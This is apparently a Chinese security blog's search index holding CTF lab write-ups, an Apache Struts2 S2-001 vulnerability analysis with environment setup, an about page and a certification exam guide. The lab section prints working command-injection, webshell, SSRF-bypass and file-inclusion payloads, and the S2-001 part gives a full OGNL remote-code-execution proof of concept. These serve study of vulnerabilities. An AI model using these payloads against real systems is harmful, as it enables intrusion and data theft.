echo输出内容，改变响应包的大小来做区分。 POST / HTTP/1.1 Host: 118.195.198.108:20001 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 20 cmd=echo 123456789; 对cmd参数加标记，进行暴破，观察响应包大小变化，最后变化的就是密码，密码为pass 进行命令控制，读取flag pass=echo `ls`; pass=echo `cat 3daddreEt30Nx.txt`; ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:4:0","tags":["PTS","CTF","证书"],"title":"PTS 谷安预报名测试","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["靶场"],"content":"5、var_dump 💡Hint Warning: var_dump() expects at least 1 parameter, 0 given in /var/www/html/index.php(4) : eval()'d code on line 1 \u003c?php #error_reporting(0); $a = @$_REQUEST['hello']; eval( \"var_dump($a);\"); show_source (__FILE__); ?\u003e 命令注入，闭合var_dump POC： /?hello=);echo`ls`;// /?hello=);echo`cat x8kwjkzp1ik.txt`;// ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:5:0","tags":["PTS","CTF","证书"],"title":"PTS 谷安预报名测试","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["靶场"],"content":"6、curl_exec 💡Hint \u003c?php error_reporting(0); highlight_file(__FILE__); $url=$_POST['url']; $x=parse_url($url); if($x['scheme']==='http'||$x['scheme']==='https'){ if(!preg_match('/localhost|127.0.0.1/',$x['host'])){ $ch=curl_init($url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo ($result); }else{ die('hacker'); } }elseif ($x['scheme']== NULL){ die(''); }else { die('oh no hacker'); } ?\u003e //flag.php url=http://xxxxxx/flag.php 考点，对localhost、127.0.0.1的绕过 127.0.0.1 十进制整数：url=http://2130706433/flag.php 十六进制：url=http://0x7F.0.0.1/flag.php 八进制：url=http://0177.0.0.1/flag.php 十六进制整数：url=http://0x7F000001/flag.php 缺省模式：127.0.0.1写成127.1 CIDR：url=http://127.127.127.127/flag.php url=http://0/flag.php url=http://0.0.0.0/flag.php 经过尝试，只有如下成功绕过，其他会造成400报错 url=http://127.127.127.127/flag.php url=http://0x7F000001/flag.php url=http://0.0.0.0/flag.php ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:6:0","tags":["PTS","CTF","证书"],"title":"PTS 谷安预报名测试","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["靶场"],"content":"7、你真的会使用webshell吗？ 💡Hint 你真的会使用webshell吗？ \u003c?php @eval($_POST['cmd']);?\u003e 不会 ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:7:0","tags":["PTS","CTF","证书"],"title":"PTS 谷安预报名测试","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["靶场"],"content":"8、Hello English 💡Hint \u003c?php if( !ini_get('display_errors') ) { ini_set('display_errors', 'On'); } error_reporting(E_ALL); $lan = $_COOKIE['language']; if(!$lan) { @setcookie(\"language\",\"english\"); @include(\"english.php\"); } else { @include($lan.\".php\"); } $x=file_get_contents('index.php'); echo $x; ?\u003e Poc: Cookie: language=data:text/plain,\u003c?php phpinfo()%3b?\u003e Cookie: language=php://filter/read=convert.base64-encode/resource=./flag ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:8:0","tags":["PTS","CTF","证书"],"title":"PTS 谷安预报名测试","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":null,"content":"AboutMe ","date":"2023-02-18","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"基本信息: Long way to go…. 一个纠结的网络安全工作者； CISP、信息安全工程师 Web、Android、逆向 📚 资深读者、🏹 初级弓箭手、🎮 老玩家 座右铭（鸡汤）： 让优秀成为一种习惯 热爱生活，认真生活，享受生活 锐意进取，但行好事，莫问前程 ","date":"2023-02-18","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"社交平台 Github：XavierRoot Gitee：XavierRoot CSDN：XavierDarkness 公众号： ","date":"2023-02-18","objectID":"/about/:3:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"工作经历 奇安信网神信息技术有限公司 北京安天网络安全技术有限公司 杭州安煜科技有限公司（实习） ","date":"2023-02-18","objectID":"/about/:4:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"学校专业： 学校：东北林业大学 专业：信息与计算科学 ","date":"2023-02-18","objectID":"/about/:5:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Xavier's friends","date":"2023-02-14","objectID":"/friends/","tags":null,"title":"友情链接","uri":"/friends/"},{"categories":["代码审计"],"content":"S2-001 漏洞是一种影响 Apache Struts 2 框架的远程代码执行 (RCE) 漏洞。 该漏洞是由 Struts 2 框架中不正确的输入验证引起的，它允许攻击者通过向 Struts 2 应用程序发送特制的 HTTP 请求来执行任意代码。","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","tags":["漏洞分析","Java","Struts2"],"title":"S2-001漏洞分析","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["代码审计"],"content":"一、简介 ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:1:0","tags":["漏洞分析","Java","Struts2"],"title":"S2-001漏洞分析","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["代码审计"],"content":"1.1 Struts2 Struts2是流行和成熟的基于MVC设计模式的Web应用程序框架。 Struts2不只是Struts1下一个版本，它是一个完全重写的Struts架构。 ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:1:1","tags":["漏洞分析","Java","Struts2"],"title":"S2-001漏洞分析","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["代码审计"],"content":"1.2 S2-001 Remote code exploit on form validation error S2-001 漏洞是一种影响 Apache Struts 2 框架的远程代码执行 (RCE) 漏洞。 该漏洞是由 Struts 2 框架中不正确的输入验证引起的，它允许攻击者通过向 Struts 2 应用程序发送特制的 HTTP 请求来执行任意代码。 这个漏洞的核心在于，form的验证错误时，会解析ognl语法，导致命令执行. poc: %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"pwd\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} 调试POC： %{1+5} 信息获取： # tomcat path %{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"} # web path %{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()} ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:1:2","tags":["漏洞分析","Java","Struts2"],"title":"S2-001漏洞分析","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["代码审计"],"content":"二、环境搭建 macOS M2 Java version \"1.8.0_261\" IDEA 2020.2 tomcat 9.0.70 ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:0","tags":["漏洞分析","Java","Struts2"],"title":"S2-001漏洞分析","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["代码审计"],"content":"2.1 Maven 配置 通过Maven创建项目，Archetype,选择webapp。 高级设置下，然后groupid和artifactid都可以自定义，之后Finish。 然后会自动下载所需的jar包等文件进行构建，只需要静静等待几分钟就好了。 然后此时创建好的项目如图所示。 接下来分别添加并配置Maven的pom.xml，Tomcat的web.xml，Struts2的struts.xml。 2.1.1 Java代码 在main目录下创建一个java文件夹，里面放置我们自定义的java类文件. 在里面我们创建自定义的Java Package。 然后在其中创建一个名为LoginAction的Java类，内容为: package org.example.s2001.action; import com.opensymphony.xwork2.ActionSupport; public class LoginAction extends ActionSupport{ private String username = null; private String password = null; public String getUsername() { return this.username; } public String getPassword() { return this.password; } public void setUsername(String username) { this.username = username; } public void setPassword(String password) { this.password = password; } public String execute() throws Exception { if ((this.username.isEmpty()) || (this.password.isEmpty())) { return \"error\"; } if ((this.username.equalsIgnoreCase(\"admin\")) \u0026\u0026 (this.password.equals(\"admin\"))) { return \"success\"; } return \"error\"; } } 刚开始添加了代码之后可能会有报错，这是因为没有引入com.opensymphony.xwork2.ActionSupport该包. 可以先不用管，去配置一下pom.xml就好了。 2.1.2 pom.xml 接下来修改pom.xml，添加如下内容:(添加到\u003cdependencies\u003e这一对标签中) \u003cdependency\u003e \u003cgroupId\u003eorg.apache.struts\u003c/groupId\u003e \u003cartifactId\u003estruts2-core\u003c/artifactId\u003e \u003cversion\u003e2.0.8\u003c/version\u003e \u003c/dependency\u003e 添加这个配置之后，点击界面上出现了maven更新小按钮Maven会自动将对应版本的Jar包下载导入，不需要手工配置了。 2.1.3 web.xml 再修改web.xml，在这里主要是配置struts2的过滤器。 \u003cweb-app\u003e \u003cdisplay-name\u003eS2-001 Example\u003c/display-name\u003e \u003cfilter\u003e \u003cfilter-name\u003estruts2\u003c/filter-name\u003e \u003cfilter-class\u003eorg.apache.struts2.dispatcher.FilterDispatcher\u003c/filter-class\u003e \u003c/filter\u003e \u003cfilter-mapping\u003e \u003cfilter-name\u003estruts2\u003c/filter-name\u003e \u003curl-pattern\u003e/*\u003c/url-pattern\u003e \u003c/filter-mapping\u003e \u003cwelcome-file-list\u003e \u003cwelcome-file\u003eindex.jsp\u003c/welcome-file\u003e \u003c/welcome-file-list\u003e \u003c/web-app\u003e 然后，在 webapp 目录下创建\u0026修改两个文件 —— index.jsp\u0026welcome.jsp，内容如下。 1、index.jsp \u003c%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%\u003e \u003c%@ taglib prefix=\"s\" uri=\"/struts-tags\" %\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"\u003e \u003ctitle\u003eS2-001\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch2\u003eS2-001 Demo\u003c/h2\u003e \u003cp\u003elink: \u003ca href=\"https://cwiki.apache.org/confluence/display/WW/S2-001\"\u003ehttps://cwiki.apache.org/confluence/display/WW/S2-001\u003c/a\u003e\u003c/p\u003e \u003cs:form action=\"login\"\u003e \u003cs:textfield name=\"username\" label=\"username\" /\u003e \u003cs:textfield name=\"password\" label=\"password\" /\u003e \u003cs:submit\u003e\u003c/s:submit\u003e \u003c/s:form\u003e \u003c/body\u003e \u003c/html\u003e 2、welcome.jsp \u003c%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%\u003e \u003c%@ taglib prefix=\"s\" uri=\"/struts-tags\" %\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"\u003e \u003ctitle\u003eS2-001\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cp\u003eHello \u003cs:property value=\"username\"\u003e\u003c/s:property\u003e\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e 2.1.4 struts.xml 然后在 main 文件夹下创建一个 resources 文件夹，内部添加一个 struts.xml，内容为： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE struts PUBLIC \"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN\" \"http://struts.apache.org/dtds/struts-2.0.dtd\"\u003e \u003cstruts\u003e \u003cpackage name=\"S2-001\" extends=\"struts-default\"\u003e \u003caction name=\"login\" class=\"com.mengsec.s2001.action.LoginAction\"\u003e \u003cresult name=\"success\"\u003ewelcome.jsp\u003c/result\u003e \u003cresult name=\"error\"\u003eindex.jsp\u003c/result\u003e \u003c/action\u003e \u003c/package\u003e \u003c/struts\u003e 这里遇到了个小问题，就是添加 struts.xml 文件时新建文件模板里没有对应的配置，可以安装Struts2插件 1、struts2 插件 解决方案就是在首选项 =\u003e plugins =\u003e 搜索struts2 然后安装就好了 此时项目目录如下： ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:1","tags":["漏洞分析","Java","Struts2"],"title":"S2-001漏洞分析","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["代码审计"],"content":"2.2 配置服务器 2.2.1 安装Tomcat 接下来配置Tomcat服务器，在Mac上的话，直接 brew install tomcat@9 即可安装tomcat9。 To have launchd start tomcat now and restart at login: brew services start tomcat Or, if you don’t want/need a background service you can just run: catalina run 如果想要后台启动服务，使用：brew services start tomcat 不需要的话直接：catalina run xavier@Mac S2-001 % brew install tomcat@9 Running `brew update --auto-update`... ==\u003e Auto-updated Homebrew! ........ # 略 ==\u003e Pouring tomcat@9--9.0.70.all.bottle.tar.gz ==\u003e Caveats Configuration files: /opt/homebrew/etc/tomcat@9 tomcat@9 is keg-only, which means it was not symlinked into /opt/homebrew, because this is an alternate version of another formula. If you need to have tomcat@9 first in your PATH, run: echo 'export PATH=\"/opt/homebrew/opt/tomcat@9/bin:$PATH\"' \u003e\u003e ~/.zshrc To restart tomcat@9 after an upgrade: brew services restart tomcat@9 Or, if you don't want/need a background service you can just run: /opt/homebrew/opt/tomcat@9/bin/catalina run ==\u003e Summary 🍺 /opt/homebrew/Cellar/tomcat@9/9.0.70: 628 files, 15.4MB ==\u003e Running `brew cleanup tomcat@9`... Disable this behaviour by setting HOMEBREW_NO_INSTALL_CLEANUP. Hide these hints with HOMEBREW_NO_ENV_HINTS (see `man brew`). xavier@Mac S2-001 % 这里安装的目录，在IDEA中找不到，于是我手动将其复制到了 xavier@Mac S2-001 % ls /opt/homebrew/etc/tomcat@9 Catalina catalina.properties jaspic-providers.xml logging.properties tomcat-users.xml web.xml catalina.policy cocontext.xml jaspjaspic-providers.xsdrverserver.xml tomcat-utomcat-users.xsd xavier@Mac S2-001 % ls ~/tomcat xavier@Mac S2-001 % cp -r /opt/homebrew/opt/tomcat@9/ ~/tomcat/tomcat@9/ xavier@Mac S2-001 % ls ~/tomcat tomcat@9 2.2.2 添加服务器 添加一个本地的Tomcat服务器。具体步骤如下图: 这个路径参考前面安装时提到的安装目录 端口根据自身环境修改. 然后右下角的提示，可以点击fix或者点击Deployment，添加一个artifacts。 然后点击左上角的绿色三角就可以运行了。 2.2.3 一些bug 测试时，最开始是通过brew install tomcat默认安装了最新版的Tomcat 10.0.x 版本，该版本运行环境时会出现报错。大致报错如下： 至少有一个JAR被扫描用于TLD但尚未包含TLD。 为此记录器启用调试日志记录，以获取已扫描但未在其中找到TLD的完整JAR列表。 在扫描期间跳过不需要的JAR可以缩短启动时间和JSP编译时间。 ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:2","tags":["漏洞分析","Java","Struts2"],"title":"S2-001漏洞分析","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["代码审计"],"content":"2.3 测试环境 在username 的输入框输入：%{1+1} 如图，环境搭建成功！ ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:3","tags":["漏洞分析","Java","Struts2"],"title":"S2-001漏洞分析","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["代码审计"],"content":"三、漏洞分析 ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:3:0","tags":["漏洞分析","Java","Struts2"],"title":"S2-001漏洞分析","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["代码审计"],"content":"3.1 前置知识： 3.1.1 S2-001 简介 该漏洞是由于 Struts 2 框架处理 HTTP 请求中某些参数的方式存在缺陷。 具体来说，该框架无法正确验证这些参数中的用户输入，从而允许攻击者将恶意负载注入应用程序。 有效负载可以包含应用程序处理请求时在服务器上执行的任意代码。 WebWork 2.1+ 和 Struts 2 的“altSyntax”功能允许将 OGNL 表达式插入到文本字符串中并进行递归处理。 这允许恶意用户通常通过 HTML 文本字段提交包含 OGNL 表达式的字符串，如果表单验证失败，服务器将执行该表达式。 对该漏洞进行分析，我们需要知道如下内容： 1. struts2是怎么运作的 2. Java的反射机制和Java的类加载机制和Java的动态代理 3. Ognl表达式 4. IDEA调试方法 3.1.2 Struts2 架构\u0026请求处理流程 根据Struts2的执行过程进行分析： 在该图中，一共给出了四种颜色的标识，其对应的意义如下。 Servlet Filters(橙色)：过滤器，所有的请求都要经过过滤器的处理。 Struts Core(浅蓝色)：Struts2的核心部分。 Interceptors(浅绿色)：Struts2的拦截器。 User created(浅黄色)：需要开发人员创建的部分。 HTTP请求经过一系列的过滤器，最后到达 FilterDispatcher 过滤器。 FilterDispatcher 将请求转发 ActionMapper，判断该请求是否需要处理。 如果该请求需要处理，FilterDispatcher会创建一个 ActionProxy 来进行后续的处理。 ActionProxy 拿着HTTP请求，询问 struts.xml 该调用哪一个 Action 进行处理。 当知道目标Action之后，实例化一个ActionInvocation来进行调用。 然后运行在Action之前的拦截器，图中就是拦截器1、2、3。 运行Action，生成一个Result。 Result根据页面模板和标签库，生成要响应的内容。 根据响应逆序调用拦截器，然后生成最终的响应并返回给Web服务器。 ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:3:1","tags":["漏洞分析","Java","Struts2"],"title":"S2-001漏洞分析","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["代码审计"],"content":"3.2 代码调试 首先在index.jsp中输入数值并提交后，根据web.xml中配置的过滤器，会到达org.apache.struts2.dispatcher.FilterDispatcher，然后判断为需要处理请求，创建一个ActionProxy。ActionProxy根据struts.xml配置确定调用哪个Action进行处理，知道目标Action后，会实例化一个ActionInvocation去调用org.example.s2001.action.LoginAction。在这个过程中，就会先允许相应的拦截器。 3.2.1 拦截器 在username字段输入%{1+5}，点击Submit，FilterDispatcher下doFilter进行过滤器调度， 我们关注ParametersInterceptor拦截器，在doIntercept这里打了该断点，跟踪参数传递。 可以看到ParametersInterceptor141行中的doIntercept，在159处执行setParameters(action, stack, parameters)，跟踪下去，此时堆栈parameters保存我们传入的参数。 进入setParameters，该方法将我们传入的数据进行了保存: // com.opensymphony.xword2.interceptor.ParametersInterceptor#doIntercept protected void setParameters(Object action, ValueStack stack, final Map parameters) { ParameterNameAware parameterNameAware = (action instanceof ParameterNameAware) ? (ParameterNameAware) action : null; Map params = null; if( ordered ) { params = new TreeMap(getOrderedComparator()); params.putAll(parameters); } else { params = new TreeMap(parameters); // 保存参数 } for (Iterator iterator = params.entrySet().iterator(); iterator.hasNext();) { Map.Entry entry = (Map.Entry) iterator.next(); String name = entry.getKey().toString(); boolean acceptableName = acceptableName(name) \u0026\u0026 (parameterNameAware == null || parameterNameAware.acceptableParameterName(name)); if (acceptableName) { Object value = entry.getValue(); try { stack.setValue(name, value); // 保存参数,参数入栈 } catch (RuntimeException e) { ... } } } doIntercept:167 return invocation.invoke();，接下去会经过一系列其他的拦截器 加载完拦截器后，会调用invocation.invoke(也就是DefaultActionInvocation 的invoke()) invoke中会调用invokeActionOnly,跟进 // public String invokeActionOnly() throws Exception { return invokeAction(getAction(), proxy.getConfig()); } invokeActionOnly接着调用自身invokeaction，继续跟进 invokeaction通过反射方式调用用户action里的execute，回到我们自己写的LoginAction.java，开始处理用户层逻辑。 // public String execute() throws Exception { if ((this.username.isEmpty()) || (this.password.isEmpty())) { return \"error\"; } if ((this.username.equalsIgnoreCase(\"admin\")) \u0026\u0026 (this.password.equals(\"admin\"))) { return \"success\"; } return \"error\"; } 3.2.2 Result 在处理完用户逻辑后会调用DefaultActionInvocation 的executeResult()处理请求结果，跟进 // com.opensymphony.xword2.DefaultActionInvocation#executeResult private void executeResult() throws Exception { result = createResult(); String timerKey = \"executeResult: \"+getResultCode(); try { UtilTimerStack.push(timerKey); if (result != null) { result.execute(this); } else if (resultCode != null \u0026\u0026 !Action.NONE.equals(resultCode)) { ... } else { ... } } finally { UtilTimerStack.pop(timerKey); } } executeResult会调用result实现类StrutsResultSupport下的execute进行处理， // com.apache.struts2.dispatcher#execute public void execute(ActionInvocation invocation) throws Exception { this.lastFinalLocation = this.conditionalParse(this.location, invocation); this.doExecute(this.lastFinalLocation, invocation); } 调用栈：execute:177–\u003econditionalParse:190–\u003etranslateVariables:56–\u003etranslateVariables:100，不重要。 跟进doExecute，跟进org.apache.struts2.dispatcher.ServletDispatcherResult， // com.apache.struts2.dispatcher.ServletDispatcherResult#doExecute public void doExecute(String finalLocation, ActionInvocation invocation) throws Exception { if (log.isDebugEnabled()) { log.debug(\"Forwarding to location \" + finalLocation); } PageContext pageContext = ServletActionContext.getPageContext(); if (pageContext != null) { pageContext.include(finalLocation); } else { HttpServletRequest request = ServletActionContext.getRequest(); HttpServletResponse response = ServletActionContext.getResponse(); RequestDispatcher dispatcher = request.getRequestDispatcher(finalLocation); if (dispatcher == null) { response.sendError(404, \"result '\" + finalLocation + \"' not found\"); return; } if (!response.isCommitted() \u0026\u0026 request.getAttribute(\"javax.servlet.include.servlet_path\") == null) { request.setAttribute(\"struts.view_uri\", finalLocation); request.setAttribute(\"struts.request_uri\", request.getRequestURI()); dispatcher.forward(request, response); //跟进 } else { dispatcher.include(request, response); ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:3:2","tags":["漏洞分析","Java","Struts2"],"title":"S2-001漏洞分析","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["代码审计"],"content":"四、修复 这里最终加入的循环递归深度判断，当完成解析之后就直接跳出。 ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:4:0","tags":["漏洞分析","Java","Struts2"],"title":"S2-001漏洞分析","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["代码审计"],"content":"参考文章： Struts2 漏洞分析环境搭建 —— 学习S2环境搭建。 Mac下安装配置Tomcat 9, Homebrew安装Tomcat ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:5:0","tags":["漏洞分析","Java","Struts2"],"title":"S2-001漏洞分析","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["职业生涯"],"content":"一、简介 ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:1:0","tags":["证书"],"title":"软考-中级信息安全工程师","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["职业生涯"],"content":"1.1 软考介绍 软考，即计算机技术与软件专业技术资格（水平）考试，以下为官方介绍： 计算机技术与软件专业技术资格（水平）考试（以下简称计算机软件资格考试）是原中国计算机软件专业技术资格和水平考试（简称软件考试）的完善与发展。计算机软件资格考试是由国家人力资源和社会保障部、工业和信息化部领导下的国家级考试，其目的是科学、公正地对全国计算机与软件专业技术人员进行职业资格、专业技术资格认定和专业技术水平测试。 更多信息见官网：https://www.ruankao.org.cn/。 软考共设置了27个专业资格，涵盖5个专业领域， 3个级别层次（初级、中级、高级），资格设置见下图： 本文基于个人经历，向大家分享软考中级资格的信息安全工程师报考经验。 ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:1:1","tags":["证书"],"title":"软考-中级信息安全工程师","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["职业生涯"],"content":"1.2 信息安全工程师 信息安全工程师，考试科目共两科： （1）网络信息安全基础知识和技术，考试时间为150分钟，笔试，75道选择题，45分通过； （2）网络信息安全工程与综合应用实践，考试时间为150分钟，笔试，5/6道问答题，45分通过； 1.信息安全基础知识 上午考试内容为基础知识和技术，单选题，但是知识面广，内容细致，因此只要有针对性地加强复习，多刷刷题，一般没什么问题。下图为知乎网友整理的知识点表格。 2.信息安全应用技术 下午试题内容为综合应用实践，都是问答题，呈由易到难分布。前面的问题少，后面的问题多而复杂，需要多复习，有些难度。 2020年信息安全工程师考试大纲进行了改版，具体考试内容以新版的《信息安全工程师考试大纲》为准。 准备备考资料时，也需要注意版本，新版本增加了物联网、云计算、人工智能、大数据等新兴技术。 ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:1:2","tags":["证书"],"title":"软考-中级信息安全工程师","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["职业生涯"],"content":"二、报考流程： ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:2:0","tags":["证书"],"title":"软考-中级信息安全工程师","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["职业生涯"],"content":"关注动态： 中国计算机技术职业资格网：提供相关政策、动态、考试安排 关注考试安排，《202x年全国计算机技术与软件专业技术资格(水平)考试工作安排》，会写考试时间，根据这个时间去安排，去年报名是考试前2个月。 ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:2:1","tags":["证书"],"title":"软考-中级信息安全工程师","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["职业生涯"],"content":"考试报名： 软考网上报名平台 通过网上报名平台进行报名，需要进行信息填报，身份确认，网上缴费等，考试报名费为￥114。 报名缴费完成之后，就可以开始备考了。 等到考前一周左右，可以打印准考证了，这时候也就知道自己在哪个考场了。 仔细核对准考证内容，并按照要求参加考试。 ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:2:2","tags":["证书"],"title":"软考-中级信息安全工程师","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["职业生涯"],"content":"三、如何备考 知乎：如何备考软考中级信息安全工程师？https://www.zhihu.com/question/314497181 去年报名时间为8月29日-9月7日，考试时间为11月5日，中间有2个月时间备考，当然最好还是提前开始准备。 一般建议4-5个月，对于零基础的学员来说，有可能时间会很长，要想全面掌握知识考点，必须吃透教材和考试大纲，安排充足的学习时长，将软考的书籍知识点吃透吃扎实。 